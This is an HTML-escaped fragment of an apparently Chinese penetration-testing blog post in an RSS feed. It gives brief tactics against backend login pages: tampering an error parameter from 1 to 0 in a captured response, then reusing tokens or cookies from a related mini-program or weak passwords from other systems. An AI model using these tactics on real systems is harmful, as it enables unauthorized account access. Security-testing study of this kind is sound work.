&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630110131.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630110246.png" alt="image.png">&lt;/p>
&lt;h3 id="总结">总结&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">这时候再尝试逻辑漏洞就不现实了，现在这种带#的这种漏洞就不多了。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="思路二">思路二&lt;/h1>
&lt;p>如果遇到Cookie:admin-token=未知&lt;br>
如果遇到一个后台登录页面，抓包发现一个error返回参数为1，然后修改参数0，进行尝试发送后，遇到返回数据中有Cookie:admin-token=未知后，我们的思路是：&lt;/p>
&lt;ol>
&lt;li>找小程序的token/Cookie，抓取过去进行尝试&lt;/li>
&lt;li>找其他系统的弱口令进行尝试修改。&lt;/li>
&lt;/ol></description></item></channel></rss>